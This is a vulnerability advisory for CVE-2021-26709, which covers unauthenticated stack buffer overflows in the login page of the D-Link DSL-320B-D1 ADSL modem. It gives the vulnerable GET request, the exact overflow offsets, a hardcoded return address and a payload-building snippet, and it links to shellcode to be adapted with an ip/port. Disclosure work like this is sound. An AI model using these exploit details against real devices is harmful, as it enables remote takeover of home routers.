======== < 0. Overview > ===============================================

Release Date: 7 March 2021

Revision: 1.0

Impact:

The ADSL modem DSL-320B-D1, version EU_1.25 and lower, is affected to
multiple Stack Buffer Overflows that allow unauthenticated remote
attackers to takeover the device.

Severity: Critical

CVSS Score: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

CVE-ID: CVE-2021-26709

Vendor: D-Link

Affected Products: DSL-320B-D1

Affected Versions: EU_1.25 and lower

======== < 1. Details > ================================================

During a Penetration Test it was possible to identify and exploit
multiple Stack Buffer Overflows (1) in the D-Link DSL-320B-D1 ADSL modem
,a now legacy model, which is distributed in the past by Telecom Italia
on loan for use together with the residential ADSL line.

The vulnerabilities are present in the login functionality, exposed by
"login.xgi" with "user" and "pass" parameters.

[[
GET /login.xgi?user=" + payload + "&pass=abcde HTTP/1.1\nHost: " +
host + "\n\n"
]]

To exploit the vulnerability using "user" parameter, you need
construct the payload like the following:

[[
OFFSET = 652
ADDR = 0x7ffe8ab0

payload = "A"*OFFSET
payload += pack(">I", ADDR)
payload += shellcode
]]

While the "pass" parameter uses 641 as offset.

The payload must be passed as parameter value in a GET request.

You can found a working shellcode here:
https://www.exploit-db.com/shellcodes/45541

You will have to change the ip/port to match your network configuration.

Using ROP is possible to avoid to use the hardcoded addresses.
